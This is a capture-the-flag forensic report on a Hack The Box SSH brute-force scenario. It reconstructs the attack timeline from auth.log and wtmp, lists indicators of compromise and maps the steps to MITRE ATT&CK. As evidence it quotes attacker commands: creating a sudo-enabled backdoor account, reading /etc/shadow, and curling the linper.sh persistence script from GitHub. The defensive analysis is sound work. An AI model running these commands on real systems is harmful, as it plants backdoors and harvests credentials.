# 🔐 SSH Brute Force Attack Analysis Report - Hack The Box Challenge

* **Date of Analysis:** 30 August 2025
* **Analyst:** Belhamici Abderrahmane
* **Source:** [Hack The Box - SSH Brute Force Challenge](https://app.hackthebox.com/home)
* **Dataset:** Authentication logs (auth.log) and login records (wtmp)
* **Target System:** ip-172-31-35-28 (AWS EC2 Instance)

---

## 1. Executive Summary

This report details the analysis of a successful SSH brute force attack against an AWS EC2 instance. The attack demonstrates a sophisticated multi-phase approach involving credential brute forcing, privilege escalation, persistence establishment, and malicious script deployment. The threat actor successfully compromised the root account, created a backdoor user with sudo privileges, and attempted to download additional attack tools.

The incident showcases the critical importance of implementing proper SSH security controls, monitoring authentication attempts, and maintaining comprehensive logging for incident response.

---

## 2. Case Overview

* **Incident Date (UTC):** March 6, 2024
* **Time Range:** 06:18:01 - 06:41:01 UTC
* **Target System:** ip-172-31-35-28 (AWS EC2 Ubuntu 6.2.0-1018-aws)
* **Attack Vector:** SSH Password Brute Force
* **Primary Attacker IP:** 65.2.161.68
* **Secondary IP (Legitimate Access):** 203.101.190.9
* **Attack Success:** Yes - Full system compromise achieved

---

## 3. Key Findings

### 3.1 Attack Summary

**Brute Force Attack:**
- **Attacker IP:** 65.2.161.68 (Mumbai, India - AWS EC2 instance)
- **Target Accounts:** backup (9 failed attempts), root (6 failed attempts before success)
- **Attack Duration:** 8 minutes 5 seconds (06:31:33 - 06:39:38 UTC)
- **Success Rate:** Root account compromised after multiple attempts

**Post-Compromise Activities:**
- **Backdoor Creation:** cyberjunkie user account established
- **Privilege Escalation:** sudo group membership granted
- **Credential Access:** /etc/shadow file accessed
- **Payload Deployment:** External script download attempted (linper.sh)

### 3.2 Infrastructure Analysis

**Target System:**
- **Hostname:** ip-172-31-35-28
- **Platform:** AWS EC2 Instance (Ubuntu Linux 6.2.0-1018-aws)
- **Network:** Private AWS subnet (172.31.x.x range)
- **SSH Service:** OpenSSH with password authentication enabled

**Attack Infrastructure:**
- **Primary IP:** 65.2.161.68
- **Hostname:** ec2-65-2-161-68.ap-south-1.compute.amazonaws.com
- **Location:** Mumbai, Maharashtra, India (19.0728,72.8826)
- **ASN:** AS16509 Amazon.com, Inc.
- **Timezone:** Asia/Kolkata
- **Service:** AWS EC2 instance in ap-south-1 region

---

## 4. Attack Timeline Analysis

| Time (UTC) | Phase | Event | Source IP | Description |
|------------|--------|-------|-----------|-------------|
| 06:19:54 | Pre-Attack | Legitimate root login | 203.101.190.9 | Normal administrative access |
| 06:31:33-42 | Brute Force | Failed password attempts | 65.2.161.68 | Multiple attempts against 'backup' and 'root' accounts |
| 06:31:40 | Initial Breach | Root password success | 65.2.161.68 | First successful root authentication |
| 06:32:44 | Session Establishment | Manual login (Session 37) | 65.2.161.68 | Interactive terminal session established |
| 06:34:18 | Persistence Phase | User account creation | 65.2.161.68 | 'cyberjunkie' user created via root session |
| 06:34:26 | Privilege Escalation | Password assignment | 65.2.161.68 | Password set for cyberjunkie account |
| 06:35:15 | Privilege Escalation | Sudo privileges granted | 65.2.161.68 | cyberjunkie added to sudo group |
| 06:37:24 | Session Termination | Root session closed | 65.2.161.68 | End of initial compromise session |
| 06:37:34 | Backdoor Access | cyberjunkie login | 65.2.161.68 | Access using newly created backdoor account |
| 06:37:57 | Reconnaissance | Shadow file access | 65.2.161.68 | Credential harvesting attempt |
| 06:39:38 | Payload Deployment | Script download attempt | 65.2.161.68 | Malicious script retrieval via curl |

---

## 5. Brute Force Attack Analysis

### 5.1 Attack Pattern Characteristics

**Target Accounts:**
- `backup` - 9 failed attempts (06:31:33-42)
- `root` - 6 failed attempts before success (06:31:39-41)

**Attack Methodology:**
- **Parallel Connections:** Multiple simultaneous SSH connections from different ports
- **Account Enumeration:** Targeted common service accounts (backup, root)
- **Password Spraying:** Systematic credential testing
- **Session Validation:** Immediate disconnection after successful authentication test

### 5.2 Brute Force Success Indicators

**Failed Attempts Summary:**
```
06:31:33-34: 9 failed attempts against 'backup' account
06:31:39-41: 6 failed attempts against 'root' account
06:31:40: SUCCESSFUL authentication for root
06:31:40: Immediate disconnection (authentication test)
06:32:44: Manual interactive login established
```

**Technical Details:**
- **Connection Ports:** 46512, 46468, 46568, 46538, 46576, 46582 (backup), 46852, 46876, 46890 (root)
- **Success Port:** 34782 (initial), 53184 (interactive session)
- **Authentication Failures:** Multiple PAM authentication failures logged
- **Connection Management:** Quick disconnection after credential validation

---

## 6. Post-Compromise Activity Analysis

### 6.1 Persistence Establishment

**Account Creation Process:**
1. **Group Creation:** `cyberjunkie` group (GID=1002) created at 06:34:18
2. **User Creation:** `cyberjunkie` user (UID=1002) with /home/cyberjunkie directory and bash shell
3. **Password Assignment:** User password configured at 06:34:26
4. **Profile Setup:** User information updated via chfn at 06:34:31
5. **Privilege Escalation:** User added to sudo group at 06:35:15

### 6.2 Reconnaissance Activities

**Shadow File Access:**
- **Command:** `sudo /usr/bin/cat /etc/shadow`
- **Timestamp:** 06:37:57
- **Purpose:** Credential harvesting and privilege verification
- **User Context:** cyberjunkie with sudo privileges

### 6.3 Malicious Payload Deployment

**Script Download Attempt:**
- **URL:** `https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`
- **Tool:** `linper.sh` (Linux Persistence script)
- **Command:** `sudo /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`
- **Timestamp:** 06:39:38
- **Purpose:** Advanced persistence and post-exploitation capabilities

---

## 7. Indicators of Compromise (IOCs)

| Indicator | Type | Description | Context |
|-----------|------|-------------|---------|
| `65.2.161.68` | IP Address | Primary attacker source IP | SSH brute force origin (Mumbai, India) |
| `ec2-65-2-161-68.ap-south-1.compute.amazonaws.com` | Hostname | Attacker's AWS hostname | Infrastructure fingerprint |
| `cyberjunkie` | Username | Backdoor account created | Persistence mechanism |
| `linper.sh` | Filename | Malicious persistence script | Post-exploitation tool |
| `raw.githubusercontent.com/montysecurity/linper/main/linper.sh` | URL | Script download location | Payload source |
| `backup` | Username | Brute force target account | Initial attack vector |
| Session 37 | Session ID | Attacker's interactive session | Compromise timeline |
| Port 53184 | Network | Attacker's interactive session port | Network fingerprint |
| UID 1002 | User ID | cyberjunkie user identifier | Persistence artifact |
| GID 1002 | Group ID | cyberjunkie group identifier | Privilege structure |

---

## 8. MITRE ATT&CK Framework Mapping

### 8.1 Attack Techniques Observed

| Technique ID | Technique Name | Evidence | Timestamp |
|--------------|----------------|----------|-----------|
| T1110.001 | Brute Force: Password Guessing | Multiple failed SSH attempts | 06:31:33-42 |
| T1078.003 | Valid Accounts: Local Accounts | Successful root account compromise | 06:31:40 |
| T1136.001 | Create Account: Local Account | cyberjunkie user creation | 06:34:18 |
| T1548.003 | Abuse Elevation Control: Sudo | cyberjunkie added to sudo group | 06:35:15 |
| T1003.008 | Credential Dumping: /etc/shadow | Shadow file access via sudo | 06:37:57 |
| T1105 | Ingress Tool Transfer | Curl download of linper.sh | 06:39:38 |
| T1543.003 | Create/Modify System Process | Persistence script deployment | 06:39:38 |

### 8.2 Attack Chain Analysis

**Initial Access → Persistence → Privilege Escalation → Credential Access → Collection**

1. **Initial Access:** SSH brute force (T1110.001)
2. **Persistence:** Local account creation (T1136.001)
3. **Privilege Escalation:** Sudo group membership (T1548.003)
4. **Credential Access:** Shadow file reading (T1003.008)
5. **Command and Control:** External script download (T1105)

---

## 9. Technical Analysis

### 9.1 Log File Analysis Summary

**auth.log Analysis:**
- Total failed authentication attempts: 15
- Successful authentications: 4 (1 legitimate, 3 attacker)
- Primary attack timeframe: 06:31:33 - 06:39:38 UTC
- Attack duration: 8 minutes 5 seconds

**wtmp Analysis:**
- Login session tracking confirmed
- Interactive session establishment verified
- Session termination timestamps validated
- User account login confirmations

### 9.2 Command Execution Timeline

```bash
06:34:18 - groupadd cyberjunkie (GID=1002)
06:34:18 - useradd cyberjunkie (UID=1002)
06:34:26 - passwd cyberjunkie (password set)
06:34:31 - chfn cyberjunkie (profile update)
06:35:15 - usermod -a -G sudo cyberjunkie
06:37:57 - sudo cat /etc/shadow
06:39:38 - sudo curl [malicious URL]
```

---

## Conclusion

The analysis reveals a sophisticated SSH brute force attack that successfully compromised an AWS EC2 instance through systematic credential testing, rapid persistence establishment, and advanced tool deployment. The attacker operated from another AWS EC2 instance in Mumbai, India, demonstrating professional-level operational security by creating legitimate-looking backdoor accounts, immediately escalating privileges, and attempting to deploy advanced persistence frameworks.

The successful compromise within an 8-minute timeframe emphasizes the importance of proper SSH configuration, real-time detection capabilities, and comprehensive monitoring. The attacker's use of legitimate cloud infrastructure and GitHub-hosted tools highlights the challenges in distinguishing malicious from legitimate activities in modern threat landscapes.
